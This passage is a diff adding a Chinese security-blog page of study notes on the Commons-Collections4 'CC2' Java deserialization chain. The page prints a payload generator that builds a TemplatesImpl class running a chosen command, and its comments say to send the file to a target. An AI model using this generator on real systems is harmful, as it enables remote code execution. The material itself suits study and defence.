@@ -1,0 +1,410 @@
+<!doctype html><html lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>CC链子2 | 1ux4ry Archive</title><meta name=description content="由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。"><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700;800&family=Space+Grotesk:wght@400;500;700&display=swap" rel=stylesheet><link rel=stylesheet href=/css/main.css></head><body><div class=site-bg></div><div class=site-shell><header class=topbar><a class=brand href=/><span>1ux4ry Archive</span></a><nav class=main-nav aria-label=主导航><a href=/>合集</a>
+<a href=/posts/>归档</a>
+<a href=/categories/>分类</a>
+<a href=/tags/>标签</a>
+<a href=/about/>关于</a>
+<a href=/friends/>友链</a>
+<a href=https://github.com/luxuryzcx>GitHub</a></nav></header><section class="page-block article-layout article-layout--with-toc"><aside class=article-toc aria-label=文章大纲><div class=article-toc__inner><p class=article-toc__kicker>ON THIS PAGE</p><div class=article-toc__content><nav id=TableOfContents><ul><li><ul><li><a href=#前言>前言</a></li><li><a href=#原理>原理</a></li><li><a href=#步骤>步骤</a><ul><li><a href=#cc2generatorjava>CC2Generator,java</a></li></ul></li><li><a href=#总结>总结</a></li></ul></li></ul></nav></div></div></aside><article class=article-single><section class=article-hero-card aria-label=CC链子2><div class="article-hero-card__glow article-hero-card__glow--cyan"></div><div class="article-hero-card__glow article-hero-card__glow--pink"></div><div class="article-hero-card__glow article-hero-card__glow--amber"></div><p class=article-hero-card__command>1ux4ry@archive:~# ./JAVA_安全_持续学习</p><div class=article-hero-card__title><span class=article-hero-card__title-main>Java 安全 持续学习</span>
+<span class=article-hero-card__title-sub>CC链子2</span></div><p class=article-hero-card__meta>安全研究 / Java 安全 持续学习 / 1ux4ry Archive</p><p class=article-hero-card__desc>由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。</p></section><header class=page-head><p class=page-kicker>ARTICLE</p><p class=article-series>Java 安全 持续学习</p><h1>CC链子2</h1><div class=single-meta><span>2026-06-14</span>
+<span>安全研究</span>
+<span># Java安全 # 安全研究</span></div></header><div class="page-copy content-body"><h2 id=前言>前言</h2><p>由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。这篇文章收录在「Java 安全 持续学习」系列中，用来沉淀对应主题的分析与记录。</p><h2 id=原理>原理</h2><ul><li><p>依赖 <code>commons-collections4</code> (4.0-4.4 版本)</p></li><li><p>使用 <code>PriorityQueue</code> 作为反序列化入口</p></li><li><p>使用 <code>TemplatesImpl</code> 加载恶意字节码实现任意代码执行</p></li></ul><p>不是通过runtime.getruntime.exec()来执行最后命令的，而是通过 TemplatesImpl 接收恶意字节码并调用 newTransformer() JVM 加载恶意类，恶意代码在内存中执行 这种黑名单防御不了 是通过内存实现的</p><p>整体流程</p><p>PriorityQueue.readObject()
+↓
+PriorityQueue.heapify()
+↓
+PriorityQueue.siftDown()
+↓
+PriorityQueue.siftDownUsingComparator()
+↓
+TransformingComparator.compare()
+↓
+ChainedTransformer.transform()
+↓
+ConstantTransformer / InvokerTransformer
+↓
+TemplatesImpl.newTransformer()
+↓
+TemplatesImpl.getTransletInstance()
+↓
+TemplatesImpl.defineTransletClasses()
+↓
+Runtime.getRuntime().exec()</p><h2 id=步骤>步骤</h2><p>源代码</p><h3 id=cc2generatorjava>CC2Generator,java</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>cc2</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>javassist.*</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>javassist.bytecode.AccessFlag</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections4.Transformer</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections4.comparators.TransformingComparator</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections4.functors.ChainedTransformer</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections4.functors.ConstantTransformer</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections4.functors.InvokerTransformer</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.FileOutputStream</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ObjectOutputStream</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Field</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.util.PriorityQueue</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=cm>/**
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> * CC2 Payload 生成器
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> * 生成恶意序列化文件，反序列化后会弹出计算器
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> *
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> * 使用方法:
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> * 1. 运行此程序生成 cc2.ser 文件
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> * 2. 将 cc2.ser 发送给目标
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> * 3. 目标反序列化该文件时会执行命令
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> */</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>CC2Generator</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>args</span><span class=p>.</span><span class=na>length</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>1</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;CC2 Payload 生成器&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;==================&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;用法: java CC2Generator &lt;输出文件&gt;&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;示例: java CC2Generator cc2.ser&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;\n注意: 反序列化生成的文件会执行 calc 命令弹出计算器&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>outputFile</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>args</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[*] 开始生成 CC2 Payload...&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 生成 Payload</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>payload</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>generatePayload</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 序列化到文件</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>serialize</span><span class=p>(</span><span class=n>payload</span><span class=p>,</span><span class=w> </span><span class=n>outputFile</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[+] Payload 生成完成！&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[+] 输出文件: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>outputFile</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[+] 反序列化该文件将执行 calc 命令&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     * 生成 CC2 Payload
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     *
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     * @return 可触发反序列化攻击的 PriorityQueue 对象
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>generatePayload</span><span class=p>()</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[*] 步骤1: 生成恶意字节码...&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>evilBytes</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>generateEvilBytecode</span><span class=p>(</span><span class=s>&#34;calc&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[*] 步骤2: 创建 TemplatesImpl 实例...&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TemplatesImpl</span><span class=w> </span><span class=n>templates</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>createTemplatesImpl</span><span class=p>(</span><span class=n>evilBytes</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[*] 步骤3: 构造 ChainedTransformer...&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ChainedTransformer</span><span class=w> </span><span class=n>chainedTransformer</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>createTransformerChain</span><span class=p>(</span><span class=n>templates</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[*] 步骤4: 创建 TransformingComparator...&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TransformingComparator</span><span class=w> </span><span class=n>comparator</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransformingComparator</span><span class=p>(</span><span class=n>chainedTransformer</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[*] 步骤5: 封装进 PriorityQueue...&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>PriorityQueue</span><span class=w> </span><span class=n>queue</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>PriorityQueue</span><span class=p>(</span><span class=n>2</span><span class=p>,</span><span class=w> </span><span class=n>comparator</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>queue</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>1</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>queue</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>2</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[+] Payload 生成完成！&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>queue</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     * 生成恶意字节码
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     *
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     * @param command 要执行的系统命令
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     * @return 恶意类的字节数组
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=nf>generateEvilBytecode</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>command</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ClassPool</span><span class=w> </span><span class=n>pool</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ClassPool</span><span class=p>.</span><span class=na>getDefault</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 添加当前类的 ClassPath，以便访问 JDK 内部类</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>pool</span><span class=p>.</span><span class=na>insertClassPath</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>ClassClassPath</span><span class=p>(</span><span class=n>CC2Generator</span><span class=p>.</span><span class=na>class</span><span class=p>));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 创建恶意类</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CtClass</span><span class=w> </span><span class=n>evilClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pool</span><span class=p>.</span><span class=na>makeClass</span><span class=p>(</span><span class=s>&#34;EvilClass&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>System</span><span class=p>.</span><span class=na>nanoTime</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 设置父类为 AbstractTranslet（必须）</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>evilClass</span><span class=p>.</span><span class=na>setSuperclass</span><span class=p>(</span><span class=n>pool</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=s>&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 添加静态代码块执行命令</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>body</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>String</span><span class=p>.</span><span class=na>format</span><span class=p>(</span><span class=s>&#34;Runtime.getRuntime().exec(\&#34;%s\&#34;);&#34;</span><span class=p>,</span><span class=w> </span><span class=n>command</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>evilClass</span><span class=p>.</span><span class=na>makeClassInitializer</span><span class=p>().</span><span class=na>insertBefore</span><span class=p>(</span><span class=n>body</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 添加必须实现的抽象方法</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 创建虚拟的 SerializationHandler 接口</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CtClass</span><span class=w> </span><span class=n>domClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pool</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=s>&#34;com.sun.org.apache.xalan.internal.xsltc.DOM&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CtClass</span><span class=w> </span><span class=n>dtmIteratorClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pool</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=s>&#34;com.sun.org.apache.xml.internal.dtm.DTMAxisIterator&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CtClass</span><span class=w> </span><span class=n>shInterface</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pool</span><span class=p>.</span><span class=na>makeInterface</span><span class=p>(</span><span class=s>&#34;com.sun.org.apache.xml.internal.serialize.SerializationHandler&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 方法1: transform(DOM, DTMAxisIterator, SerializationHandler)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CtMethod</span><span class=w> </span><span class=n>method1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>CtMethod</span><span class=p>(</span><span class=n>CtClass</span><span class=p>.</span><span class=na>voidType</span><span class=p>,</span><span class=w> </span><span class=s>&#34;transform&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>CtClass</span><span class=o>[]</span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>domClass</span><span class=p>,</span><span class=w> </span><span class=n>dtmIteratorClass</span><span class=p>,</span><span class=w> </span><span class=n>shInterface</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>},</span><span class=w> </span><span class=n>evilClass</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>method1</span><span class=p>.</span><span class=na>setModifiers</span><span class=p>(</span><span class=n>AccessFlag</span><span class=p>.</span><span class=na>PUBLIC</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>method1</span><span class=p>.</span><span class=na>setBody</span><span class=p>(</span><span class=s>&#34;{}&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>evilClass</span><span class=p>.</span><span class=na>addMethod</span><span class=p>(</span><span class=n>method1</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 方法2: transform(DOM, SerializationHandler[])</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 使用 Object[] 类型替代</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CtMethod</span><span class=w> </span><span class=n>method2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>CtMethod</span><span class=p>(</span><span class=n>CtClass</span><span class=p>.</span><span class=na>voidType</span><span class=p>,</span><span class=w> </span><span class=s>&#34;transform&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>CtClass</span><span class=o>[]</span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
